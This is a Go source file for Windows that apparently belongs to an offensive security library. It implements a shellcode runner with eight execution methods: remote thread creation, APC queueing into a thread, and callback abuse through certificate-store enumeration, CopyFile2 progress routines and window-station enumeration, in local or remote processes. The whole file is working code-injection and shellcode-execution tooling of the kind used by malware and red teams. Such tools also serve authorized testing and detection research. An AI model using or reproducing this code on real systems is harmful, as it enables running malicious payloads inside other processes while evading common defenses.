//go:build windows

package runsc

import (
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"

	"github.com/mjwhitta/errors"
	w32 "github.com/mjwhitta/win/api"
)

// Consts for supported run methods.
const (
	CertEnumPhysicalStore RunMethod = iota + 1
	CertEnumSystemStore
	CopyFile2
	EnumWindowStationsW
	NtCreateThreadEx
	NtQueueApcThread
	NtQueueApcThreadEx
	RtlCreateUserThread
)

var runMethods map[RunMethod]rFunc = map[RunMethod]rFunc{
	CertEnumPhysicalStore: runCertPhysical,
	CertEnumSystemStore:   runCertSystem,
	CopyFile2:             runCopy,
	EnumWindowStationsW:   runEnumWS,
	NtCreateThreadEx:      runCreateThreadEx,
	NtQueueApcThread:      runApcThread,
	NtQueueApcThreadEx:    runApcThreadEx,
	RtlCreateUserThread:   runUserThread,
}

func runApc(
	s *state,
	f func(windows.Handle, uintptr) error,
) (*state, error) {
	var e error

	//nolint:godox // Not sure how to fix this right now
	// FIXME why?
	s.thread, e = w32.RtlCreateUserThread(s.proc, 0, s.l.suspend)
	if e != nil {
		return nil, errors.Newf("failed to create thread: %w", e)
	}

	if e = f(s.thread, s.addr); e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func runApcThread(s *state) (*state, error) {
	return runApc(s, w32.NtQueueApcThread)
}

func runApcThreadEx(s *state) (*state, error) {
	return runApc(s, w32.NtQueueApcThreadEx)
}

func runCertPhysical(s *state) (*state, error) {
	var e error

	if s.l.suspend {
		e = errors.New("cannot suspend with CertEnumPhysicalStore")
		return nil, e
	}

	e = w32.CertEnumPhysicalStore(
		"My",
		w32.Wincrypt.CertSystemStoreCurrentUser,
		0,
		s.addr,
	)
	if e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func runCertSystem(s *state) (*state, error) {
	var e error

	if s.l.suspend {
		e = errors.New("cannot suspend with CertEnumSystemStore")
		return nil, e
	}

	e = w32.CertEnumSystemStore(
		w32.Wincrypt.CertSystemStoreCurrentService,
		0,
		0,
		s.addr,
	)
	if e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func runCopy(s *state) (*state, error) {
	var e error
	var expected string = "The system cannot find the file specified."
	var tmp string = filepath.Join("c:/", "windows", "temp")

	if s.l.pid != 0 {
		e = errors.New("cannot run via CopyFile2 in remote process")
		return nil, e
	}

	if s.l.suspend {
		return nil, errors.New("cannot suspend with CopyFile2")
	}

	_ = os.Remove(filepath.Join(tmp, "notfound.src"))
	_ = os.Remove(filepath.Join(tmp, "notfound.dst"))

	e = w32.CopyFile2(
		filepath.Join(tmp, "notfound.src"),
		filepath.Join(tmp, "notfound.dst"),
		w32.CopyFile2ExtendedParameters{ProgressRoutine: s.addr},
	)
	if e != nil {
		if !strings.HasSuffix(e.Error(), expected) {
			e = errors.Newf("failed to execute shellcode: %w", e)
			return nil, e
		}
	}

	return s, nil
}

func runCreateThreadEx(s *state) (*state, error) {
	var e error

	s.thread, e = w32.NtCreateThreadEx(s.proc, s.addr, s.l.suspend)
	if e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func runEnumWS(s *state) (*state, error) {
	var e error

	if s.l.pid != 0 {
		return nil, errors.New(
			"cannot run via EnumWindowStationsW in remote process",
		)
	}

	if s.l.suspend {
		e = errors.New("cannot suspend with EnumWindowStationsW")
		return nil, e
	}

	if e = w32.EnumWindowStationsW(s.addr, 0); e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}

func runUserThread(s *state) (*state, error) {
	var e error

	s.thread, e = w32.RtlCreateUserThread(s.proc, s.addr, s.l.suspend)
	if e != nil {
		return nil, errors.Newf("failed to execute shellcode: %w", e)
	}

	return s, nil
}
